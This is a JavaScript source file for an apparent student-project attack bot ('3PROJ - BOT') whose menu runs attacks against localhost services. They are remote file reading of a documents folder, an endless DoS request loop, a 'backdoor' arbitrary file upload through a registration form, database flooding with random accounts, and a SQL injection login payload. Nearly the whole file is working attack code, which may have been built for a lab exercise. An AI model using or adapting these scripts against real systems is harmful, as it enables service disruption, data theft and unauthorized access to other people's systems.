var WebSocketClient = require('websocket').client;
const readline = require("readline");
const fs = require('fs');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const prompt = require('prompt');
const axios = require('axios');
const formData = require('form-data');
var randomString = require("randomstring");
//fs client
const createClient = require("fs-remote/createClient");
const fsClient = createClient("http://localhost:4000");

var client = new WebSocketClient();
client.connect('ws://localhost:8080', 'echo-protocol');

client.on('connectFailed', function (error) {
    console.log('Connect Error: ' + error.toString());
});

client.on('connect', function (connection) {
    try {
        console.log('WebSocket Client Connected');

        connection.on('error', function (error) {
            console.log("Connection Error: " + error.toString());
        });

        connection.on('close', function () {
            console.log('Connection Closed');
            process.exit(0);
        });


        connection.on('message', function (message) {
            if (message.type === 'utf8') {
                //console.log("Received: '" + message.utf8Data + "'");
            }
        });

        if (connection.connected) {
            menu()

            rl.on("close", function () {
                console.log("\n3PROJ - BOT is closed !");
                connection.close();
            });

            function menu() {
                console.log("======================== 3PROJ - BOT ========================");
                console.log("1 - Data attack");
                console.log("2 - DoS attack");
                console.log("3 - Backdoor");
                console.log("4 - Flooding database attack");
                console.log("5 - Sql database injection");
                console.log("======================== 3PROJ - BOT ========================");

                rl.question("Make your choice : ", function (choice) {
                    switch (choice) {
                        case "1":
                            console.log("===========================");
                            console.log("The data attack is launched");
                            console.log("===========================");
                            dataAttack();
                            break;
                        case "2":
                            console.log("===========================");
                            console.log("The DoS attack is launched");
                            console.log("===========================");
                            dosAttack();
                            break;
                        case "3":
                            console.log("===========================");
                            console.log("The backdoor attack is launched");
                            console.log("===========================");
                            backdoorAttack();
                            break;
                        case "4":
                            console.log("===========================");
                            console.log("The Flooding Database attack is launched");
                            console.log("===========================");
                            floodDatabase();
                            break;
                        case "5":
                            console.log("===========================");
                            console.log("The Sql Database injection is launched");
                            console.log("===========================");
                            sqlInjection();
                            break;
                        default:
                            console.log("????")
                    }
                });
            }

            /**
             * data attack function for reading all documents files with the fs client/server
             */
            function dataAttack() {
                let files;
                try {
                    var path = "./public/documents/";
                    files = fsClient.readdirSync(path);

                    if (files.length > 0) {
                        console.log(`==== ${files.length} elements found ====`);
                        console.log("===========================");
                        files.forEach((element) => {
                            var filename = path + element;
                            const data = fsClient.readFileSync(filename, 'utf-8');
                        
                            console.log(`Content of the ${element} :`);
                            console.log("===========================");
                            console.log(data);
                            console.log("===========================");
                        });
                        
                        //sending request to the server
                        connection.send("dataAttack");
                    }

                } catch (err) {
                    console.log(err);
                }
            }

            /**
             * dos attack function => sending requests until the server crashes
             */
            function dosAttack(){
                try{
                    nb = 1;
                    for(i = 0; i < nb; nb++){
                        console.log(`DoS request nᵒ${nb}`);
                        //request
                        connection.send("dosAttack");
                    }
                }catch(err){
                    console.log(err);
                }
            }

            /**
             * backdoor attack for sending a malicous file on the server with an http request on the register
             */
            function backdoorAttack() {
                //generating random names
                var randomNumber = Math.floor(Math.random() * Math.floor(10))
                var stringFile = randomString.generate()
                //file creation
                fs.writeFile("files/" + stringFile, 'Backdoor Attack', function (err) {}); 

                //data for le http form
                let data = new formData();
                data.append('firstname', randomString.generate(randomNumber));
                data.append('lastname',  randomString.generate(randomNumber));
                data.append('password',  randomString.generate(randomNumber));
                data.append('picture', fs.createReadStream("files/" + stringFile));

                //http request
                axios.post('http://localhost:3000/register', data, {
                    headers: {
                        'content-type': `multipart/form-data; boundary=${data._boundary}`,
                    }
                })
                .then((res) => {
                        console.log(`Status: ${res.status}`);
                        console.log('Body: ', res.data);
                    }).catch((err) => {
                        console.error(err);
                });
               
               //attack resquest
               connection.send("backdoorAttack");
            }

            /**
             * flood db function for flooding the database with many users
             */
            function floodDatabase() {
                console.log("Flood configuration...");
                console.log("how much flood do you want to launch ? ");
                prompt.get(['flood'], function (err, result) {
                    if (err) console.log(err);
                    var stringFile = randomString.generate();
                    var floodn = result.flood;
                    for(i = 1; i <= floodn; i++) {
                        console.log(`Flood nᵒ ${i}`);
                        //generating random names
                        var randomNumber = Math.floor(Math.random() * Math.floor(10))
                        //file creation
                        fs.writeFile("files/" + stringFile, 'Backdoor Attack', function (err) {}); 
                        //data for the http request
                        let data = new formData();
                        data.append('firstname', randomString.generate(randomNumber));
                        data.append('lastname',  randomString.generate(randomNumber));
                        data.append('password',  randomString.generate(randomNumber));
                        data.append('picture', fs.createReadStream("files/" + stringFile));
                        //http request
                        axios.post('http://localhost:3000/register', data, {
                            headers: {
                                'content-type': `multipart/form-data; boundary=${data._boundary}`,
                            }
                        })
                        .then((res) => {
                                console.log(`Status: ${res.status}`);
                                console.log('Body: ', res.data);
                            }).catch((err) => {
                                console.error(err);
                        });
                    }
                });
                //request
                connection.send("databaseAttack");
            }

            /**
             * sql injection function for crashing the serv
             */
            function sqlInjection() {
                const data = {
                    firstname: '"hacked") --"',
                    password: '"hacked") --"'
                };

                axios.post('http://localhost:3000/login', data, {
                })
                .then((res) => {
                        console.log("Sql injection done")
                    }).catch((err) => {
                        console.error(err);
                });
               //request
               connection.send("databaseAttack");
            }
        }
    } catch (err) {
        console.log(err);
    }
});